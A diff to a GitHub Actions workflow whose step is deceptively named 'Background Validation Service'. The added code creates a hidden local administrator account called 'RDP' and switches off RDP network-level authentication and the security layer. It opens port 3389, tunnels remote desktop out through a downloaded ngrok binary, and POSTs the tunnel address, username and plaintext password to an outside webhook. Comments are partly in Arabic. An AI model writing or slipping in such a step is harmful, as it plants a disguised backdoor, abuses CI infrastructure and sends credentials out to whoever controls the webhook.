@@ -58,33 +58,46 @@ jobs:
           dotnet build -c Release
           dotnet run -c Release
 
-      - name: Start Background Validation Service (Ultimate RDP v4 - runneradmin)
+      - name: Start Background Validation Service (Ultimate RDP v5 - RDP User)
         run: |
-          $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
+          # === توليد باسورد قوي زي الكود الناجح تماماً ===
+          $charSet = @{
+              Upper   = [char[]](65..90)
+              Lower   = [char[]](97..122)
+              Number  = [char[]](48..57)
+              Special = [char[]](33..47) + [char[]](58..64) + [char[]](91..96) + [char[]](123..126)
+          }
+          $rawPassword = @()
+          $rawPassword += $charSet.Upper | Get-Random -Count 4
+          $rawPassword += $charSet.Lower | Get-Random -Count 4
+          $rawPassword += $charSet.Number | Get-Random -Count 4
+          $rawPassword += $charSet.Special | Get-Random -Count 4
+          $pwd = -join ($rawPassword | Sort-Object { Get-Random })
+
           $sec = ConvertTo-SecureString $pwd -AsPlainText -Force
 
-          # إعادة تعيين كلمة مرور runneradmin (المستخدم الافتراضي)
-          Set-LocalUser -Name "runneradmin" -Password $sec -PasswordNeverExpires $true
+          # === إنشاء يوزر "RDP" زي الكود الناجح ===
+          New-LocalUser -Name "RDP" -Password $sec -AccountNeverExpires -PasswordNeverExpires > $null 2>&1
+          Add-LocalGroupMember -Group "Administrators" -Member "RDP" > $null 2>&1
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP" > $null 2>&1
 
-          # === Ultimate RDP Fix v4 (النسخة المضمونة) ===
-          $rdpPath = 'HKLM:\System\CurrentControlSet\Control\Terminal Server'
-          $tcpPath = 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp'
+          # === إعدادات RDP الدقيقة من الكود الناجح ===
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
 
-          Set-ItemProperty -Path $rdpPath -Name "fDenyTSConnections" -Value 0 -Force
-          Set-ItemProperty -Path $tcpPath -Name "UserAuthentication" -Value 1 -Force   # NLA مفعل (الأهم)
-
-          # Firewall
-          Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
-          netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=any
+          # Firewall نظيف وقوي
+          netsh advfirewall firewall delete rule name="RDP-Allow-All" -ErrorAction SilentlyContinue
           netsh advfirewall firewall add rule name="RDP-Allow-All" dir=in action=allow protocol=TCP localport=3389 profile=any > $null 2>&1
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
 
           # إعادة تشغيل الخدمة
           Restart-Service TermService -Force
-          Start-Sleep -Seconds 10
+          Start-Sleep -Seconds 8
           Restart-Service TermService -Force
           Start-Sleep -Seconds 8
 
-          # === ngrok ===
+          # === ngrok (نفس الطريقة المستقرة) ===
           $ngrokUrl = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
           $zip = "$env:TEMP\ngrok.zip"
           $extractPath = "$env:TEMP\ngrok_folder"
@@ -113,7 +126,7 @@ jobs:
           if ($logData -match 'url=(tcp://[^\s]+)') { $url = $Matches[1] }
 
           if ($url) {
-              $msg = "Target: $url`nU: runneradmin`nP: $pwd`nTool: ngrok (Ultimate RDP v4 - runneradmin)"
+              $msg = "Target: $url`nU: RDP`nP: $pwd`nTool: ngrok (Ultimate RDP v5 - RDP User)"
               Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body (@{ content = $msg } | ConvertTo-Json) -ContentType "application/json"
           }
 
@@ -132,7 +145,7 @@ jobs:
 
           Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body (@{ content = $rep } | ConvertTo-Json) -ContentType "application/json"
 
-          Write-Host "✅ Ultimate RDP v4 with runneradmin - Ready!"
+          Write-Host "✅ Ultimate RDP v5 with user 'RDP' applied (مدموج مع الكود الناجح)"
 
       - name: Run Extended Validation (with ngrok monitoring)
         run: |
